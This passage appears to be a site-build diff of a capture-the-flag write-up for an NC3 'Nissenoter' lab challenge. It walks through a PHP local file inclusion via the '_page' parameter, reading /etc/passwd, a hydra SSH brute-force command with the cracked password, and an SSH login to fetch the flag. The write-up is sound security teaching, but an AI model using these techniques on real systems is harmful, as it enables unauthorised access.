-</span></span><span style="display:flex;"><span>rrensdyr:x:1003:1003::/home/rrensdyr:/bin/bash
-</span></span><span style="display:flex;"><span>gynter:x:1004:1004::/home/gynter:/bin/bash
-</span></span><span style="display:flex;"><span>nis:x:1005:1005::/home/nis:/bin/bash
-</span></span></code></pre></div><p>Huge win for our LFI exploit! We now know which users can access the server! Now we can begin to test the users against our collected password to hopefully find valid SSH credentials!</p>
-<h3 id="hydra-bruteforce-ssh">Hydra bruteforce SSH<a href="#hydra-bruteforce-ssh" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>This can be achieved with the tool <a href="https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/">hydra</a>, which is outstanding for bruteforce logins!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ hydra -L users.txt -P passwords.txt nissenoter.nc3 ssh -t <span style="color:#ae81ff">4</span>
-</span></span><span style="display:flex;"><span>Hydra v9.4 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2023-12-21 10:31:29
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">4</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">4</span> tasks, <span style="color:#ae81ff">84</span> login tries <span style="color:#f92672">(</span>l:6/p:14<span style="color:#f92672">)</span>, ~21 tries per task
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://nissenoter.nc3:22/
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: nissenoter.nc3   login: rrensdyr   password: commander007
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 84.00 tries/min, <span style="color:#ae81ff">84</span> tries in 00:01h, <span style="color:#ae81ff">1</span> to <span style="color:#66d9ef">do</span> in 00:01h, <span style="color:#ae81ff">3</span> active
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
-</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2023-12-21 10:32:29
-</span></span></code></pre></div><p>Fantastic! It would appear that the naughty reindeer reused his password! (Hopefully Santa won&rsquo;t find out&hellip;)</p>
-<h3 id="getting-the-second-flag">Getting the second flag<a href="#getting-the-second-flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>With valid SSH credentials we simply login and fetch the user flag!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ ssh rrensdyr@nissenoter.nc3
-</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;nissenoter.nc3 (77.229.233.52)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:1SsZXNDRtiFTRXEnxik0vXpDFxbCdgSSjVsxdSE6wvs.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>nissenoter.nc3<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rrensdyr@nissenoter.nc3&#39;</span>s password:
-</span></span><span style="display:flex;"><span>Linux edc9b2907c7e 5.15.0-88-generic <span style="color:#75715e">#98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
-</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
-</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-</span></span><span style="display:flex;"><span>permitted by applicable law.
-</span></span><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ ls
-</span></span><span style="display:flex;"><span>flag.txt
-</span></span><span style="display:flex;"><span>rrensdyr@edc9b2907c7e:~$ cat flag.txt
-</span></span><span style="display:flex;"><span>NC3<span style="color:#f92672">{</span>1. Snup passwd; 2. Genbrug er god brug; 3: ????; 4: Profit!<span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>Now we can go submit the second flag and move on to the final stage in <a href="/nc3/boot2root/nissenoter-3/">Nissenoter 3</a>!</p>
-<h2 id="flag">Flag<a href="#flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NC3{1. Snup passwd; 2. Genbrug er god brug; 3: ????; 4: Profit!}
-</span></span></code></pre></div><h2 id="reflections-and-learnings">Reflections and Learnings<a href="#reflections-and-learnings" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<h3 id="importance-of-detailed-enumeration">Importance of Detailed Enumeration:<a href="#importance-of-detailed-enumeration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>The initial exploration of the web application was crucial. Identifying endpoints and functionalities laid the groundwork for the subsequent steps. It highlighted the significance of a comprehensive reconnaissance phase in any security assessment.</p>
-<h3 id="exploiting-local-file-inclusion-lfi">Exploiting Local File Inclusion (LFI):<a href="#exploiting-local-file-inclusion-lfi" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>Unraveling the LFI vulnerability by dissecting the PHP code was not an easy journey, but however a critical juncture. This not only emphasized the need for a deep understanding of application behavior but also illustrated how security flaws can be hidden in the logic and routing of an application.</p>
-<h3 id="innovating-approaches">Innovating Approaches:<a href="#innovating-approaches" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>The .htaccess files turned out to be a dead-end, which you will face many off when doing CTF events! It is important to accept that a path may not be right and be open-minded enough to pivot towards new paths!</p>
-<h3 id="the-perils-of-password-reuse">The Perils of Password Reuse:<a href="#the-perils-of-password-reuse" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>The reuse of passwords, as demonstrated by the &lsquo;rrensdyr&rsquo; user, served as a practical example of common security oversights. This scenario stressed the necessity of robust password practices and the risks associated with password reuse.</p>
-<h3 id="the-journey-from-vulnerability-to-access">The Journey from Vulnerability to Access:<a href="#the-journey-from-vulnerability-to-access" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>The step-by-step process, from finding vulnerabilities to gaining system access, is a fundamental pattern in penetration testing. This challenge was a testament to the need for patience, thoroughness, and resilience in security testing!</p>
-
-		</div>
-	</main>
-
-<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-  <p>
-    &copy; 2025 <a href="http://localhost:1313/">Adamino</a>
-    &#183; The quieter you become the more you are able to hear
-    
-    &#183;
-    
-  </p>
-
-</footer>
-
-<a href="#" class="scroll-up"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
-  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
-  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
-  stroke-width="0.00024000000000000003">
-  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
-    stroke-width="0.9600000000000002">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-  <g id="SVGRepo_iconCarrier">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-</svg></a>
-<noscript>
-    <a href="#" class="scroll-up show"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
-  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
-  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
-  stroke-width="0.00024000000000000003">
-  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
-    stroke-width="0.9600000000000002">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-  <g id="SVGRepo_iconCarrier">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-</svg></a>
-</noscript>
-<script async src="http://localhost:1313/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js" integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin="anonymous"></script>
-<script async src="http://localhost:1313/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js" integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin="anonymous"></script>
-</body>
-
-</html>
+When we take a look inside the folder we see an empty &ldquo;index.html&rdquo; file and the following &ldquo;.htaccess&rdquo; files</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>Files</span> <span style=color:#f92672>*&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>order</span> <span style=color:#a6e22e>deny</span>,<span style=color:#a6e22e>allow</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>deny</span> <span style=color:#a6e22e>from</span> <span style=color:#a6e22e>all</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>Files</span><span style=color:#f92672>&gt;</span>
+</span></span></code></pre></div><p>We can further more confirm the presence of this note by accessing it directly in the webapp</p><p><img src=/nc3/boot2root/nissenoter-2/images/htaccess%20note.png alt=".htaccess note"></p><p>This file unfortunately prohibits us from accessing &ldquo;nissenoter.nc3/user_notes&rdquo; directly, which would come in handy, if we were to place an evil reverse shell script here.
+We shall therefore try to delete the &ldquo;.htaccess&rdquo; file with the &ldquo;/notes/del/.htaccess&rdquo; request!</p><p>Even though the request didn&rsquo;t result in a 500 error message from the backend and initially seemed to be executed, the file is unfortunately still present and that rules out this exploitation path as the system might be preventing deletion of this file.</p><h3 id=lfi-exploitation>LFI exploitation<a href=#lfi-exploitation class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Lastly we have &ldquo;/notes/view/{note_name}&rdquo;, which we have already proven to have an <a href=https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion>LFI</a> vulnerability by visiting the &ldquo;.htaccess&rdquo; file as a note.</p><p>Normally when exploiting LFI, we would try to add something like &ldquo;../../etc/passwd&rdquo; to enumerate users on the system, but whenever we try this on the webapp we get redirected back to a sane URl.</p><p>We therefore need to analyse how routing is implemented in the application to understand if we might be able to exploit LFI with different parameters.</p><p>In &ldquo;/index.php&rdquo; we can see how routing is handled when trying to view a note, so let&rsquo;s get our hands dirty with some PHP analysis!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># --- Excluded everything until line 122 where the analysis gets interesting --- #
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$request_method <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$page <span style=color:#f92672>=</span> <span style=color:#a6e22e>Variable</span><span style=color:#f92672>::</span><span style=color:#a6e22e>getGet</span>(<span style=color:#e6db74>&#39;_page&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>array_key_exists</span>($request_method, $router)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>showErrorPage</span>(<span style=color:#ae81ff>405</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($router[$request_method] <span style=color:#66d9ef>as</span> $uri <span style=color:#f92672>=&gt;</span> $func) {
+</span></span><span style=display:flex><span>    $reg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;#^&#34;</span> <span style=color:#f92672>.</span> $uri <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;$#&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>($reg, $page, $params) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>        [$class, $method] <span style=color:#f92672>=</span> $func;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            $class <span style=color:#f92672>=</span> $controllers[$class];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>array_shift</span>($params);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_callable</span>([$class, $method])) {
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>call_user_func</span>([$class, $method], <span style=color:#f92672>...</span>$params);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>showErrorPage</span>(<span style=color:#ae81ff>500</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>Exception</span> $e) {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>print_r</span>($e);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>showErrorPage</span>(<span style=color:#ae81ff>404</span>);
+</span></span></code></pre></div><p>The application extracts the HTTP request method and stores it in a variable. This variable is later used to check if routes exist for that method. For instance, anything other than POST and GET will result in a 405 Method Not Allowed error.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>array_key_exists</span>($request_method, $router)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>showErrorPage</span>(<span style=color:#ae81ff>405</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>A loop iterates through routes that match the specified $request_method. The $routes[$request_method] variable is a dictionary, with the key set to a URL and the value to an array containing a class reference and a method name. This setup is vital as it dictates how different URLs are processed by the application.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($router[$request_method] <span style=color:#66d9ef>as</span> $uri <span style=color:#f92672>=&gt;</span> $func) {
+</span></span></code></pre></div><p>The PHP function preg_match is used to match the current page&rsquo;s URL ($page) against a regular expression ($reg). If there&rsquo;s a match, the result is stored in $params.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    $reg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;#^&#34;</span> <span style=color:#f92672>.</span> $uri <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;$#&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>($reg, $page, $params) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span></code></pre></div><p>For instance, a URL like notes/view/flag.txt will result in $params containing both the full path and the file name (flag.txt).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$params[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;notes/view/flag.txt&#39;</span>;
+</span></span><span style=display:flex><span>$params[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;flag.txt&#39;</span>;
+</span></span></code></pre></div><p>The array_shift function is used to remove the first element from $params, leaving only the file name in the array.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            $class <span style=color:#f92672>=</span> $controllers[$class];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>array_shift</span>($params);
+</span></span></code></pre></div><p>This is crucial for the LFI vulnerability as it directly influences what file is being accessed!</p><p>The application then calls call_user_func([$class, $method], &mldr;$params). This means that the method specified in the route is called directly with user-controlled input, without any validation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_callable</span>([$class, $method])) {
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>call_user_func</span>([$class, $method], <span style=color:#f92672>...</span>$params);
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>;
+</span></span><span style=display:flex><span>            }
+</span></span></code></pre></div><p>In the case of NotesController, the view method is called, which directly uses $note in file_get_contents, leading to the LFI vulnerability.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$controllers[<span style=color:#a6e22e>NotesController</span><span style=color:#f92672>::</span><span style=color:#a6e22e>class</span>]<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>view</span>(<span style=color:#f92672>...</span>$params);
+</span></span></code></pre></div><p>That means the the view method on the class NotesController is being invoked directly with its input, without any form of validation!</p><p>The key to exploiting this vulnerability therefore lies in manipulating the &ldquo;_page&rdquo; GET parameter.</p><p>By accessing the URL &ldquo;nissenoter.nc3/?_page=notes/view/flag.txt&rdquo;, the application interprets this as a request to view the flag.txt note, thus confirming the LFI vulnerability.</p><p><img src=/nc3/boot2root/nissenoter-2/images/LFI%20on%20flag.png alt="LFI on flag"></p><p>Great Scott! This is exciting as it confirms our LFI theory! Now we should be able to view the &ldquo;/etc/passwd&rdquo; file and search for a user on the system</p><p><img src=/nc3/boot2root/nissenoter-2/images/LFI%20users.png alt="LFI etc/passwd"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span><span style=color:#75715e># --- Excluded system users for better overview --- #</span>
+</span></span><span style=display:flex><span>osand:x:1000:1000::/home/osand:/bin/bash
+</span></span><span style=display:flex><span>fritz:x:1001:1001::/home/fritz:/bin/bash
+</span></span><span style=display:flex><span>hansi:x:1002:1002::/home/hansi:/bin/bash
+</span></span><span style=display:flex><span>rrensdyr:x:1003:1003::/home/rrensdyr:/bin/bash
+</span></span><span style=display:flex><span>gynter:x:1004:1004::/home/gynter:/bin/bash
+</span></span><span style=display:flex><span>nis:x:1005:1005::/home/nis:/bin/bash
+</span></span></code></pre></div><p>Huge win for our LFI exploit! We now know which users can access the server! Now we can begin to test the users against our collected password to hopefully find valid SSH credentials!</p><h3 id=hydra-bruteforce-ssh>Hydra bruteforce SSH<a href=#hydra-bruteforce-ssh class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>This can be achieved with the tool <a href=https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/>hydra</a>, which is outstanding for bruteforce logins!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ hydra -L users.txt -P passwords.txt nissenoter.nc3 ssh -t <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>Hydra v9.4 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2023-12-21 10:31:29
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>4</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>4</span> tasks, <span style=color:#ae81ff>84</span> login tries <span style=color:#f92672>(</span>l:6/p:14<span style=color:#f92672>)</span>, ~21 tries per task
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://nissenoter.nc3:22/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: nissenoter.nc3   login: rrensdyr   password: commander007
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 84.00 tries/min, <span style=color:#ae81ff>84</span> tries in 00:01h, <span style=color:#ae81ff>1</span> to <span style=color:#66d9ef>do</span> in 00:01h, <span style=color:#ae81ff>3</span> active
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
+</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2023-12-21 10:32:29
